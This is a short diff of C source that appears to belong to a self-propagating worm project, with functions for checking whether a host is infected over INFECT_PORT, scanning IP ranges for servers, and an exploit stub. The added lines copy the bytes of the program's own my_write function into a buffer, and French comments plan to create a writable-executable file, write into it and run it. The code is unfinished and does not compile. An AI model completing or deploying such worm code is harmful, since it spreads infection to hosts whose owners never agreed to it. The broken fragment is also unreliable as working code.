@@ -109,6 +109,23 @@ int my_execve(const char *name, char *const argv[], char *const envp[]){
     return ret;
 }
 
+void exploit(int connfd){
+	
+	// Buffer overflow
+	char buff[MAX];
+	int buff_size = 49;
+	char * s = &my_write;
+    for (int i =0;s<&my_open;s++,i++){
+        buff[i]=*s;
+    }
+	my_write()
+		// Créer un fichier WX
+		// Ecrire dedans
+		// L'executer
+
+}
+
+
 int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr){
     my_server_addr->sin_addr.s_addr = ip;
     my_server_addr->sin_port = htons(INFECT_PORT);
@@ -233,20 +250,6 @@ struct list_server * scan_server_available(char * start_IP_str, char * end_IP_st
 	print_list(opened_servers);
 	return opened_servers;
 }
-void exploit(int connfd){
-	
-	
-	// Buffer overflow
-	char buff[MAX];
-
-	my_write
-		// Créer un fichier WX
-		// Ecrire dedans
-		// L'executer
-
-}
-
-
 
 int entry_point() {
 
